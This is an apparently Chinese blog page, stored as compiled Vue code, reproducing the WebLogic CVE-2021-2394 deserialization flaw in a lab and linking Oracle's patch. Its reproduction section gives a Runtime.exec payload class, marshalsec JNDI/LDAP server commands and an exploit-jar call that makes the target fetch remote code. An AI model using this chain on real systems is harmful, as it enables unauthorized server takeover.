import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as s,c,a as e,b as i,d as n,e as r}from"./app-58e4a7d6.js";const d={},o=r(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Oracle官方发布了2021年7月份安全更新通告，通告中披露了WebLogic组件存在高危漏洞，攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击。成功利用该漏洞的攻击者可以接管WebLogic Server。</p><p>这是一个二次反序列化漏洞，是CVE-2020-14756和CVE-2020-14825的调用链相结合组成一条新的调用链来绕过weblogic黑名单列表。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Oracle WebLogic Server 10.3.6.0.0
Oracle WebLogic Server 12.1.3.0.0
Oracle WebLogic Server 12.2.1.3.0
Oracle WebLogic Server 12.2.1.4.0
Oracle WebLogic Server 14.1.1.0.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>系统环境：window10 系统</p><p>weblogic 版本：12.2.1.3，官网下载</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328155039160.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在当前目录启动，启动后访问：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328155131145.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>下载 marshalsec 利用 marshalsec 开启 JNDI 服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>https://github.com/mbechler/marshalsec # 需要自己编译
mvn clean package –DskipTests

https://github.com/RandomRobbieBF/marshalsec-jar # 可以直接使用
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建 Exploit.java，通过 javac 编译得到 Exploit.class：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public class Exploit {

    static {
        System.err.println(&quot;Pwned&quot;);
        try {
            String cmds = &quot;calc&quot;;
            Runtime.getRuntime().exec(cmds);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在同目录下使用 python 开启一个 http 服务，并使用 marshalsec 开启 JNDI 服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python -m http.server 8000
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8000/#Exploit&quot; 8087
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>使用exp进行复现：</p>`,19),u={href:"https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0",target:"_blank",rel:"noopener noreferrer"},p=r(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar CVE_2021_2394.jar 192.168.31.3 7001 ldap://192.168.3.35:8087/Exploit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328155325277.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="修复方式" tabindex="-1"><a class="header-anchor" href="#修复方式" aria-hidden="true">#</a> 修复方式</h2><p>当前官方已发布受影响版本的对应补丁，建议受影响的用户及时更新官方的安全补丁。链接如下：</p>`,4),v={href:"https://www.oracle.com/security-alerts/cpuapr2021.html",target:"_blank",rel:"noopener noreferrer"};function m(h,b){const a=l("ExternalLinkIcon");return s(),c("div",null,[o,e("ul",null,[e("li",null,[e("a",u,[i("https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0"),n(a)])])]),p,e("ul",null,[e("li",null,[e("a",v,[i("https://www.oracle.com/security-alerts/cpuapr2021.html"),n(a)])])])])}const _=t(d,[["render",m],["__file","Weblogic 二次反序列化漏洞 CVE-2021-2394.html.vue"]]);export{_ as default};
